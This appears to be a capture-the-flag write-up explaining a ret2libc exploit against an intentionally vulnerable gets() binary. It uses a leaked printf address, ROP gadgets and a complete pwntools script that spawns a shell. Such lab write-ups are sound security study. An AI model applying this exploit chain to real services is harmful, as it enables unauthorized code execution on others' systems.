---
title: "no-win-func: ret2libc from a printf leak"
date: 2026-07-19 20:00:00 +0600
series: "AlpacaHack Daily"
platform: "AlpacaHack"
summary: "No win() and NX enabled, so a leaked printf address and a two-gadget ROP chain call system(\"/bin/sh\"). All Linux work done in Docker from Windows."
description: "No win() and NX enabled, so a leaked printf address and a two-gadget ROP chain call system(\"/bin/sh\"). All Linux work done in Docker from Windows."
tags: ["pwn", "rop"]
---

<details class="toc" markdown="1">
<summary>Contents</summary>

* TOC
{:toc}

</details>

{% raw %}
## Challenge Overview

The challenge provides a single C source file compiled with stack protections disabled:

```c
// gcc -o chal main.c -fno-stack-protector -O0

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(void) {
    char buffer[64];
    printf("address of printf function: %p\n", printf);
    printf("input > ");
    gets(buffer);
    return 0;
}

__attribute__((constructor)) void setup() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
}
```

Key observations:

- `gets(buffer)` reads an **unbounded** line of input into a fixed 64-byte stack buffer — classic stack buffer overflow, no length checking.
- `-fno-stack-protector` means there's no canary to defeat.
- There is **no `win()` function** anywhere in the binary — the challenge name is a hint that the intended solution can't just be "overwrite return address with a helper function." Instead, the binary leaks the runtime address of `printf`, which is the intended primitive for defeating ASLR on the linked libc.
- `checksec` on the binary shows:

  ```
  Arch:       amd64-64-little
  RELRO:      Full RELRO
  Stack:      No canary found
  NX:         NX enabled
  PIE:        PIE enabled
  SHSTK:      Enabled
  IBT:        Enabled
  ```

> NX rules out shellcode injection on the stack, so the exploit path is a **ret2libc** attack: hijack control flow to call `system("/bin/sh")` using gadgets and functions already present in the target's libc.

The deployment (`Dockerfile` / `compose.yml`) runs on **Ubuntu 24.04**, which ships **glibc 2.39**. This matters because gadget offsets and libc symbol offsets are specific to that build.

## Environment Setup

Since the target binary is a Linux ELF, and analysis was done from Windows (no WSL2), all Linux-side work — extracting the exact libc, running GDB, and running the pwntools exploit — was done inside Docker containers rather than a WSL2 shell:

1. Built the challenge image from the provided `Dockerfile` and ran it locally to have a byte-for-byte matching binary/libc pair:

   ```sh
   docker build -t no-win-func .
   docker run -d --name chal_container -p 12346:12346 no-win-func
   ```

2. Extracted the exact `chal` binary and `libc.so.6` from the running container (critical — using a "generic" Ubuntu 24.04 libc off the internet risks subtly different gadget/symbol offsets):

   ```sh
   docker cp chal_container:/chal ./chal
   docker cp chal_container:/lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6
   ```

3. Used a separate "toolbox" container (`ubuntu:24.04` + `pwntools` + `gdb` + `ROPgadget`) with the working directory bind-mounted, to do all analysis and run the final exploit — this avoided needing WSL2 at all.

## Step 1 — Confirm the Vulnerability and Leak Primitive

- `gets()` has no bound and directly overflows `buffer[64]` on the stack.
- The program prints `printf`'s address every run:

  ```
  address of printf function: 0x7f8954b7a520
  input > 
  ```

Since PIE/ASLR randomizes the whole libc mapping as one contiguous region, leaking any one libc symbol's address is enough to compute the base of libc for that connection:

  ```
  libc_base = printf_leak - libc.symbols['printf']
  ```

From there, every other libc symbol and gadget's absolute address is `libc_base + <known offset in an unrandomized libc>`.

## Step 2 — Find the Offset to the Return Address

The buffer is 64 bytes, compiled at `-O0` with no canary, so the expected stack layout for `main`'s frame is:

```
[ 64 bytes: buffer      ]  offset 0  - 63
[  8 bytes: saved rbp   ]  offset 64 - 71
[  8 bytes: return addr ]  offset 72 - 79
```

This was verified two ways:

**1. Dynamically, with GDB, using a marked payload:**

```python
payload = b'A' * 64   # buffer
payload += b'B' * 8   # saved rbp
payload += b'C' * 8   # return address
```

Running `chal` under `gdb` and feeding this payload as input caused a SIGSEGV inside `main` (during the `leave`/`pop rbp` sequence, before `ret` ever executes, since `leave` sets `rsp = rbp` and RBP is now a bogus, unmapped 0x4242424242424242). Checking registers at the crash:

```
rbp   0x4242424242424242   0x4242424242424242
rip   0x5629708d71ce        0x5629708d71ce <main+85>
```

`rbp` coming back as a clean, unmixed `0x4242424242424242` (no bleed from either the `A`s before it or `C`s after it) confirms the saved-RBP field starts exactly at offset 64 and is exactly 8 bytes — which in turn confirms the return address starts at offset 72.

**2. Statically, via IDA's stack frame view:**

```
Frame size: 40 (0x40 = 64 bytes)   -> var_40 (the buffer region)
+0x00  __saved_registers            -> saved rbp
+0x08  __return_address             -> return address
```

This matches exactly: 64 bytes of buffer, then 8 bytes saved RBP, then the 8-byte return address at offset 72 — confirming the dynamically-derived offset statically.

## Step 3 — Find ROP Gadgets in the Extracted libc

With no `win()` function, the exploit has to build a small ROP chain that calls `system("/bin/sh")` directly using libc's own code. Needed gadgets:

- `pop rdi ; ret` — to set up the first argument (pointer to `"/bin/sh"`) for the `system()` call under the x86-64 calling convention.
- A plain `ret` — needed as an extra "stack alignment" gadget. Since glibc 2.34+, `system()` (via `__libc_system`) can execute `movaps` instructions internally which require the stack to be 16-byte aligned at the point of the call; without this, `system()` can crash with a `#GP` before ever spawning a shell.

`ROPgadget` was run directly against the extracted `libc.so.6`:

```sh
ROPgadget --binary ./libc.so.6 --only "pop|ret" | grep "pop rdi"
```

This produced many hits (`pop rdi` chained with junk instructions before hitting a `ret`), but a clean one-instruction gadget was found:

```
0x000000000010f78b : pop rdi ; ret
```

A plain `ret` gadget (`0x2882f` offset, picked from grepping `--only "ret"` output for a lone `ret`) was used for alignment.

**A note on CET (SHSTK / IBT)**

> `checksec` reported `SHSTK: Enabled` and `IBT: Enabled` (Intel CET) on the binary. In theory, a hardware-enforced shadow stack would make classic return-address overwrites fail (the CPU maintains a separate, protected copy of return addresses and traps on mismatch). In practice, this had no effect here — the deployment environment's CPU/kernel did not actually enforce CET at runtime, so a traditional ROP chain via the overwritten return address worked without modification. This is common in cloud/VM environments where CET is compiled in but the underlying hardware or hypervisor doesn't support/enable it.

## Step 4 — Resolve `system` and `"/bin/sh"`

Using pwntools directly against the extracted `libc.so.6`, once `libc.address` is set:

```python
libc.address = printf_leak - libc.symbols['printf']

system = libc.symbols['system']                # already an absolute address
binsh  = next(libc.search(b'/bin/sh\x00'))      # already an absolute address
```

## Step 5 — Build and Send the Exploit

Final payload layout:

```
[ 72 bytes padding ]   fills buffer + saved rbp
[ ret_gadget       ]   16-byte stack alignment fix for system()'s movaps
[ pop_rdi ; ret    ]   pop "/bin/sh" pointer into rdi
[ &"/bin/sh"       ]   argument for system()
[ &system          ]   system("/bin/sh") gets called on return
```

Full exploit script (`solve.py`):

```python
from pwn import *

context.arch = 'amd64'
elf = ELF('./chal')
libc = ELF('./libc.so.6')

p = remote('<host>', 63089)

p.recvuntil(b'function: ')

printf_leak = int(p.recvline().strip(), 16)
libc.address = printf_leak - libc.symbols['printf']
log.info(f'libc base: {hex(libc.address)}')

pop_rdi = libc.address + 0x10f78b
ret_gadget = libc.address + 0x2882f
binsh = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']

payload = b'A' * 72
payload += p64(ret_gadget)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.recvuntil(b'input > ')
p.sendline(payload)
p.interactive()
```

Running it against the remote instance leaked a fresh libc base each connection (as expected under ASLR), built the ROP chain relative to that base, and returned a shell:

```
[*] libc base: 0x7f8954a3b000
pop_rdi: 0x7f8954b4a78b
ret_gadget: 0x7f8954a6382f
binsh: 0x7f8954bb242f
system: 0x7f8954a93750
[*] Switching to interactive mode
$ cat /flag.txt
```

## Root Cause Summary

- **Vulnerability:** unbounded `gets()` into a fixed-size stack buffer with no stack canary → classic stack-based buffer overflow with full control of the saved RBP and return address.
- **Exploitation technique:** ret2libc. The binary's deliberate leak of `printf`'s address defeats ASLR for the whole libc mapping; from there, a two-gadget ROP chain (`pop rdi; ret` + alignment `ret`) redirects execution into `system("/bin/sh")` using only code already mapped by the process, sidestepping NX entirely (no injected shellcode needed) and requiring no `win()` function in the target binary.
- **Key defenses bypassed:** stack overflow was possible due to missing canary/`-fno-stack-protector`; NX was bypassed by reusing existing libc code (ret2libc) instead of injecting shellcode; PIE/ASLR was defeated via the intentional `printf` leak.
{% endraw %}
